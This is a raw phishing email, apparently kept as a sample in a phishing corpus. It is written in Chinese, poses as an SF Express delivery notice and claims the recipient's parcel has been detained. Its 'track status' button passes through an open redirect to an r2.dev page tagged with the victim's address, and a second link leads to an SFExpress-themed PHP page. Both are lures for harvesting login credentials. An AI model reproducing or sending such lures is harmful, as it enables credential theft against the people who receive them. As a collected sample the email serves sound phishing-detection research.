@@ -1,0 +1,299 @@
+Return-Path: trade@lowcostwindows.com
+Delivered-To: jose@monkey.org
+X-FDA: 82325921832.14.BF9E5D1
+Received: from s914653.srvape.com (s914653.srvape.com [91.219.150.60])
+	by imf10.b.hostedemail.com (Postfix) with ESMTP id A57B0A0009
+	for <jose@monkey.org>; Thu, 11 Jul 2024 02:41:54 +0000 (UTC)
+Authentication-Results: imf10.b.hostedemail.com;	dkim=none;	spf=fail
+ (imf10.b.hostedemail.com: domain of trade@lowcostwindows.com does not
+ designate 91.219.150.60 as permitted sender)
+ smtp.mailfrom=trade@lowcostwindows.com;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1720665693;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=Fb7ntq28tJnlsxX6nYDKelAaBmteqUFa8HdYXGDHLug=;
+	b=2g5JLtZe+gCKH1F3HGOSyED6iOXa6GGJE7zZ3oewrzfrSonaT6VAx5pWsz35LqwWk2Ms53
+	W0+x9QY3wqEFRgnvdcXH71W4Bk3Tjfg9fOjtVQLkwLHcrDldvLZT5re1KGjTS+Gic8Gu1a
+	FvYldpLy6KWYpPhK0riPiahiExRU9Bw=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1720665693; a=rsa-sha256;
+	cv=none;
+	b=naxaCpLAd3SXGESlIMrpm4UqmvRZqwEA+TycYPemM9Kjgyf0LQkTQUbabcQ/UWEm0xQhth
+	+HMBhsZ3ODiFd+ufsA4y6JN83tru642SfRDE7iSlhLxxABfhnwxDMticV+EqesD+VT+7Jf
+	ShPOe9XDF1p0fWNup2WY+1tQnxn4IEc=
+ARC-Authentication-Results: i=1;	imf10.b.hostedemail.com;	dkim=none;	spf=fail
+ (imf10.b.hostedemail.com: domain of trade@lowcostwindows.com does not
+ designate 91.219.150.60 as permitted sender)
+ smtp.mailfrom=trade@lowcostwindows.com;	dmarc=none
+Received: from lowcostwindows.com (localhost [IPv6:::1])
+	by s914653.srvape.com (Postfix) with ESMTP id 9AA36304A27
+	for <jose@monkey.org>; Thu, 11 Jul 2024 05:06:52 +0300 (MSK)
+Reply-To: bq2274fes@gmail.com
+From: "S.F. Service" <trade@lowcostwindows.com>
+To: jose@monkey.org
+Subject: S.F. Delivery Service . INVOICE AIR
+Date: 10 Jul 2024 19:06:52 -0700
+Message-ID: <20240710190652.FBB8DD6B1D4E732D@lowcostwindows.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: A57B0A0009
+X-Stat-Signature: 93qcpeiseg1b66up43itc6c58aznp63i
+X-Spam-Status: Yes, score=24.80
+X-HE-Tag: 1720665714-771064
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19XS4pGhJkjYor97380DK23Htb2naisI82LvxQQJZ2II6e?=
+ =?utf-8?q?hBNWxkQG1wvMom4ZaW/RA/LnohidiOog2mHbdziu232L+d74dMnOrfvI+MsYnWJ4q?=
+ =?utf-8?q?vjaebLauwpYvkhKUQF89R0Fdubrxia5Dul1HuAggmBxTmT53OSVIYjOnlqvXuTG3R?=
+ =?utf-8?q?hnFFi+IJpb8+YkWGWoUsF514uFxFMbpKSj6HfHBwPuCRswxx2UabtuGLEx6t1DHhD?=
+ =?utf-8?q?57Z5aTYuSU8y8ntEMntpeqtjZ6qclGksbLg07bhNGAtLNCAwqOAletf15kpXYEiz6?=
+ =?utf-8?q?F8DPaGx28KnXPnSNbMnVTOoAQG35AzyKhmjjS4wP1dNh9RASPeuMTQs+pVtmW+eKL?=
+ =?utf-8?q?XyQ23l8cIejHECHi+y8MBVlP8dcgQ0IS9ZGYUnaDflYtl+5qcOafbIUuYWvDZhqd3?=
+ =?utf-8?q?zaehGXjuUIKusr4Y1ZXBt4lLZoeyNgJcKpPutH+QfnLwOy0TVJgiPJWIxEWMp42sU?=
+ =?utf-8?q?K1/eY9OdjgWwNwx4p8TSmekDIiiWOeBugQMqqmHsvrlYtw7W2FdPD0L4BhvgCq5Sh?=
+ =?utf-8?q?yXdq5DiJVKlC6g3JC1fjUz5Vs3tTaynx/dknCFWRuRkdCjcshOZRSyZSXIw1l1bEA?=
+ =?utf-8?q?G4BqPN3HyTWreZAW0RpGF3OgVFykpIwyUus6R/PPuy2YFOvCZGWl6wsAHt7P7xHZO?=
+ =?utf-8?q?iSS83/Em4JTpzOqS5/pIvJq3XKLTv22A+S0Fx2i3lbHEP+aYkE/QghHZF0weUllkd?=
+ =?utf-8?q?LZ5KOG9YZyiKVDe3WAnz2DBD1doPZXvSo1iEKtQFJJ7JdIsxWpKBCutJiIhc8m3AA?=
+ =?utf-8?q?AmGvkI+VVvBo3y7x28lUoCL5AINyruEmilVU3nHdUQthn7bBkO1yIPIO0EQwqC7nV?=
+ =?utf-8?q?Rrv1+pvIhAJScnhxMIPXqZLWAplf3QdjAL0ciANVcjqQJM3kmL/ADTS4ZQZ/NN7on?=
+ =?utf-8?q?fZQnTJfIFku4rQuG81E/1+_OjqZzwZDtBeXa31YSmIkypG+3fC5C+16M54zCx2J4k?=
+ =?utf-8?q?wfgvei1lDJaLG4fTlER5hp5KPbsoyFPnZPiUWmsp7KOnPBKa6Qfyf1W49fa2fxumR?=
+ =?utf-8?q?STKPC7jSYfLgSv1PU8jeACYb1N4JK4RF4nP2vdvs5ctrjk1J5rX+uQIH54xYfpmZ6?=
+ =?utf-8?q?Z/uZP/8JF8LEOV/DU9oRnuoMHXTRS3c0YECrvKt1BZQrz4THHRRqi/ST63U1GtOtG?=
+ =?utf-8?q?XYXB5sQj/jpSjYWsBT10UEPib+dnu18KgQF4Yx3C0oQqyIAhtpCDmze2Fq5rPVD7I?=
+ =?utf-8?q?oOA984kf9Z7IHjBgkD1uenIeFSSTyyIKOM3oltMF3sc8EZyBi2lAHosPklGXspDlr?=
+ =?utf-8?q?L9Cc1F1jkl1u3UowWqX9OfdrLGmUnNHETZ2RsU/eRH7O4y30W5G0wA0RRkHISs+jf?=
+ =?utf-8?q?Yb/EEhJwGAseSgW8ZxHrYua5wYXpziEjWxsGgmvAvo7iWiKXp4HmwBMIgVCNOH2JX?=
+ =?utf-8?q?UqXE1o4KIT9tgqxqdX+hsHFxp4sN/v73AnKPF1bzRo07aLPN7+5wzZ147Vh4LYmH9?=
+ =?utf-8?q?WRaVEmhFlxkJpXrPXOHK0kHB2zTFtG7Wn01Hhwao23J8csT01Mqaq0P8AFmJotX8z?=
+ =?utf-8?q?Dn2G6QjpSLpYd1PL2+F6TPlodQCcrDhr1lXCMMk/7hp4B9Xn+rQjnji8p4u0o3cZ+?=
+ =?utf-8?q?z+RKl0+9Bi1R1lLNvBmp0uo4AkFSdfBC+R+3BMrLwmUI8GEyDoQMShq1Tja9MeT70?=
+ =?utf-8?q?2hG0f6ufQMj+1NtSJbXZKOMN6ZHTfT5j6+oLJBSmfwYBaZwXOXMR1/dv/uQM+tNQj?=
+ =?utf-8?q?V6qJwjJymOhHi2moYMNNmPBCJZ0oxo/bezIl5leEGAen9Q025w8nbpPO2ETOstFKB?=
+ =?utf-8?q?f6jWfWgNu44wzyWGfZf9lldFmAtsUKcY+I7DHzjsBijJw4UaHi26AAlV9Zu9dVSwR?=
+ =?utf-8?q?tuvsk5SO4cjxnvPBfgvM2pBUcURfyN5lNfprKDOUtr3hq?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 200
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"border-width: 0px 0px 1px; margin: 0px; padding: 0px; border-=
+radius: 5px; height: 69px; color: rgb(34, 34, 34); text-transform: none; li=
+ne-height: inherit; text-indent: 0px; letter-spacing: normal; overflow: hid=
+den; font-family: Arial; font-size: small; font-style: normal; font-weight:=
+ 400; word-spacing: 0px; vertical-align: baseline; border-bottom-color: rgb=
+(228, 228, 228); border-bottom-style: solid; white-space: normal; orphans: =
+2; widows: 2; font-stretch: inherit;=20
+font-feature-settings: inherit; background-color: rgb(249, 249, 249); font-=
+variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-thickness: initial; text-decoration-style: initi=
+al; text-decoration-color: initial; font-variant-numeric: inherit; font-var=
+iant-east-asian: inherit; font-kerning: inherit;">
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; height: 69px; color: inherit; line-height=
+: 69px; font-family: "sans serif", serif, monospace, auto; font-size: inher=
+it; font-style: inherit; font-variant: inherit; font-weight: inherit; verti=
+cal-align: baseline; float: left; display: block; font-stretch: inherit; fo=
+nt-feature-settings: inherit; font-kerning: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: rgb(174, 174, 174); line-height: i=
+nherit; font-family: "Microsoft Yahei", verdana; font-size: inherit; font-s=
+tyle: inherit; font-variant: inherit; font-weight: inherit; vertical-align:=
+ baseline; font-stretch: inherit; font-feature-settings: inherit; font-kern=
+ing: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto; font-size: 16px; font-style=
+: inherit; font-variant: inherit; font-weight: inherit; vertical-align: bas=
+eline; font-stretch: inherit; font-feature-settings: inherit; font-kerning:=
+ inherit;'><br class=3D"Apple-interchange-newline"><br>&#36816;</span></spa=
+n></span>
+<img style=3D"border-width: 0px; border-color: currentColor; font: inherit;=
+ margin: 15px 28px 15px 19px; padding: 0px; border-image: none; color: inhe=
+rit; vertical-align: baseline; float: left; max-height: 36px; min-width: 38=
+px; max-width: 100%; font-size-adjust: inherit; font-stretch: inherit;" alt=
+=3D"Shun Feng"=20
+src=3D"https://ci5.googleusercontent.com/proxy/14Q6t-Q3W6TZjEeptdzrMnGpjhQC=
+QslebHBG9VeyPB_oa-6DGs8uhTdUn6x01ngHdQCUGeKKpXmD9EAyLhGZLjDddQX4hOrWyB8YTCy=
+bpvx6uEXev_vGLw=3Ds0-d-e1-ft#http://mimg.127.net/xm/webmail/app-service/img=
+/logo/expresslogo_2.gif">
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; height: 69px; color: inherit; line-height=
+: 69px; font-family: "sans serif", serif, monospace, auto; font-size: inher=
+it; font-style: inherit; font-variant: inherit; font-weight: inherit; verti=
+cal-align: baseline; float: left; display: block; font-stretch: inherit; fo=
+nt-feature-settings: inherit; font-kerning: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: rgb(174, 174, 174); line-height: i=
+nherit; font-family: "Microsoft Yahei", verdana; font-size: inherit; font-s=
+tyle: inherit; font-variant: inherit; font-weight: inherit; vertical-align:=
+ baseline; font-stretch: inherit; font-feature-settings: inherit; font-kern=
+ing: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto; font-size: 16px; font-style=
+: inherit; font-variant: inherit; font-weight: inherit; vertical-align: bas=
+eline; font-stretch: inherit; font-feature-settings: inherit; font-kerning:=
+ inherit;'>&#21333;&#21495;</span></span></span>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; height: 69px; color: inherit; line-height=
+: 69px; font-family: "sans serif", serif, monospace, auto; font-size: inher=
+it; font-style: inherit; font-variant: inherit; font-weight: inherit; verti=
+cal-align: baseline; float: left; display: block; font-stretch: inherit; fo=
+nt-feature-settings: inherit; font-kerning: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: rgb(174, 174, 174); line-height: i=
+nherit; font-family: "Microsoft Yahei", verdana; font-size: inherit; font-s=
+tyle: inherit; font-variant: inherit; font-weight: inherit; vertical-align:=
+ baseline; font-stretch: inherit; font-feature-settings: inherit; font-kern=
+ing: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto; font-size: 16px; font-style=
+: inherit; font-variant: inherit; font-weight: inherit; vertical-align: bas=
+eline; font-stretch: inherit; font-feature-settings: inherit; font-kerning:=
+ inherit;'>: 216799004495</span></span></span><br></div>
+<div style=3D"border-width: 0px; border-color: currentColor; margin: 0px; p=
+adding: 10px 20px 5px; border-image: none; color: rgb(34, 34, 34); text-tra=
+nsform: none; line-height: inherit; text-indent: 0px; letter-spacing: norma=
+l; font-family: Arial; font-size: small; font-style: normal; font-weight: 4=
+00; word-spacing: 0px; vertical-align: baseline; white-space: normal; orpha=
+ns: 2; widows: 2; font-stretch: inherit; font-feature-settings: inherit; fo=
+nt-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial; font-varia=
+nt-numeric: inherit; font-variant-east-asian: inherit; font-kerning: inheri=
+t;"><div style=3D"border-width: 0px 0px 1px; font: inherit; margin: 0px; pa=
+dding: 0px; height: 43px; color: inherit; vertical-align: baseline; border-=
+bottom-color: rgb(228, 228, 228); border-bottom-style: dotted; font-size-ad=
+just: inherit; font-stretch: inherit;">
+<div style=3D"border-width: 0px; border-color: currentColor; font: inherit;=
+ margin: 0px; padding: 0px; border-image: none; color: inherit; vertical-al=
+ign: baseline; float: left; font-size-adjust: inherit; font-stretch: inheri=
+t;">
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: rgb(0, 0, 0); line-height: inherit=
+; font-family: "Microsoft Yahei", verdana; font-size: medium; font-style: i=
+nherit; font-variant: inherit; font-weight: inherit; vertical-align: baseli=
+ne; font-stretch: inherit; font-feature-settings: inherit; font-kerning: in=
+herit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto; font-size: inherit; font-st=
+yle: inherit; font-variant: inherit; font-weight: bolder; vertical-align: b=
+aseline; font-stretch: inherit; font-feature-settings: inherit; font-kernin=
+g: inherit;'><i>&#20320;&#22909;</i></span></span>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto;'><i>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: rgb(0, 0, 0); line-height: inherit=
+; font-family: "sans serif", serif, monospace, auto; font-size: medium; fon=
+t-style: inherit; font-variant: inherit; font-weight: inherit; vertical-ali=
+gn: baseline; font-stretch: inherit; font-feature-settings: inherit; font-k=
+erning: inherit;'>
+,&nbsp;<a id=3D"m_-466494922942325036gmail-OWAff031d83-8ee1-6d2a-500a-8c23d=
+429b154" style=3D"border-width: 0px; border-color: currentColor; font: inhe=
+rit; margin: 0px; padding: 0px; border-image: none; color: rgb(17, 85, 204)=
+; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inheri=
+t; background-color: transparent;" href=3D"http://wozaiparis.com/dir/SFExpr=
+ess/index.php?email=3Ded@163.com" target=3D"_blank">jose@monkey.org</a>&nbs=
+p;&nbsp;</span></i></span>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto;'>:&nbsp;</span>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: rgb(253, 152, 1); line-height: inh=
+erit; font-family: "Microsoft Yahei", verdana; font-size: inherit; font-sty=
+le: inherit; font-variant: inherit; font-weight: inherit; vertical-align: b=
+aseline; font-stretch: inherit; font-feature-settings: inherit; font-kernin=
+g: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto; font-size: 20px; font-style=
+: inherit; font-variant: inherit; font-weight: inherit; vertical-align: bas=
+eline; font-stretch: inherit; font-feature-settings: inherit; font-kerning:=
+ inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto; font-size: inherit; font-st=
+yle: inherit; font-variant: inherit; font-weight: bolder; vertical-align: b=
+aseline; font-stretch: inherit; font-feature-settings: inherit; font-kernin=
+g: inherit;'>&#24744;&#30340;&#29289;&#21697;&#24050;&#34987;&#21462;&#2804=
+0;</span></span></span></div></div>
+<div style=3D"border-width: 0px; border-color: currentColor; font: inherit;=
+ margin: 0px 0px 16px; padding: 0px; border-image: none; color: inherit; ve=
+rtical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;">=
+
+<div style=3D'border-width: 0px 0px 1px; margin: 0px; padding: 0px; color: =
+inherit; line-height: 40px; font-family: "sans serif", serif, monospace, au=
+to; font-size: inherit; font-style: inherit; font-variant: inherit; font-we=
+ight: inherit; vertical-align: baseline; border-bottom-color: rgb(228, 228,=
+ 228); border-bottom-style: dotted; font-stretch: inherit; font-feature-set=
+tings: inherit; font-kerning: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px 5px 0px 0px; border-image: none; color: inherit; line-height: =
+inherit; font-family: "sans serif", serif, monospace, auto;'> Wednesday, Ju=
+ly 10, 2024 7:6 p.m.&nbsp;</span>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: rgb(174, 174, 174); line-height: i=
+nherit; font-family: "Microsoft Yahei", verdana; font-size: inherit; font-s=
+tyle: inherit; font-variant: inherit; font-weight: inherit; vertical-align:=
+ baseline; font-stretch: inherit; font-feature-settings: inherit; font-kern=
+ing: inherit;'>
+<span style=3D'border-width: 0px; border-color: currentColor; margin: 0px; =
+padding: 0px; border-image: none; color: inherit; line-height: inherit; fon=
+t-family: "sans serif", serif, monospace, auto; font-size: 16px; font-style=
+: inherit; font-variant: inherit; font-weight: inherit; vertical-align: bas=
+eline; font-stretch: inherit; font-feature-settings: inherit; font-kerning:=
+ inherit;'>&#26477;&#24030;&#38382;&#39064;</span></span></div>
+<div style=3D'border-width: 0px; border-color: currentColor; margin: 0px; p=
+adding: 0px; border-image: none; color: rgb(174, 174, 174); line-height: 40=
+px; font-family: "sans serif", serif, monospace, auto;'><span style=3D"bord=
+er-width: 0px; border-color: currentColor; font: inherit; margin: 0px; padd=
+ing: 0px 4px 0px 3px; border-image: none; color: rgb(68, 68, 68); vertical-=
+align: baseline; font-size-adjust: inherit; font-stretch: inherit;">
+&#28857;&#20987;&#19979;&#38754;&#26597;&#30475;&#24744;&#24403;&#21069;&#3=
+0340;&#36816;&#36755;&#29366;&#24577;&#12290;</span></div></div><div style=
+=3D'border-width: 0px; border-color: currentColor; margin: 0px 0px 13px; pa=
+dding: 0px; border-image: none; height: 32px; color: inherit; line-height: =
+inherit; overflow: hidden; font-family: "sans serif", serif, monospace, aut=
+o;'>
+<a title=3D"Current fast track" id=3D"m_-466494922942325036gmail-OWAc6c7250=
+b-40d4-a1e7-54b7-ee51b00340ec" style=3D'margin: 0px 18px 0px 0px; padding: =
+0px; border-radius: 3px; border: 1px solid rgb(69, 152, 48); border-image: =
+none; width: 100px; height: 27px; text-align: center; color: rgb(255, 255, =
+255); line-height: 28px; overflow: hidden; font-family: "sans serif", serif=
+, monospace, auto; font-size: inherit; font-style: inherit; font-variant: i=
+nherit; font-weight: 700; vertical-align: baseline;=20
+float: left; display: block; font-stretch: inherit; font-feature-settings: =
+inherit; background-color: rgb(104, 184, 85); font-kerning: inherit;' href=
+=3D"https://www.joinmoolah.com/track?&amp;is_web=3D3&amp;pos=3Dweb_deals&am=
+p;url=3Dhttps://pub-ee2dc008eeca49d8b2c25147e025efbe.r2.dev/EDG/index.html?=
+info=3Djose@monkey.org" target=3D"_blank">&#24403;&#21069;&#29366;&#24577;&=
+#36319;&#36394;</a>
+<div style=3D"border-width: 0px; border-color: currentColor; font: inherit;=
+ margin: 0px; padding: 0px; border-image: none; color: inherit; vertical-al=
+ign: baseline; font-size-adjust: inherit; font-stretch: inherit;"></div><di=
+v style=3D"border-width: 0px; border-color: currentColor; font: inherit; ma=
+rgin: 0px; padding: 0px; border-image: none; color: inherit; vertical-align=
+: baseline; font-size-adjust: inherit; font-stretch: inherit;"><br></div></=
+div></div>
+<p style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; le=
+tter-spacing: normal; font-family: Arial; font-size: 12px; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; w=
+idows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webki=
+t-text-stroke-width: 0px; text-decoration-thickness: initial; text-decorati=
+on-style: initial; text-decoration-color: initial;"><br>&nbsp;</p></body></=
+html>
+
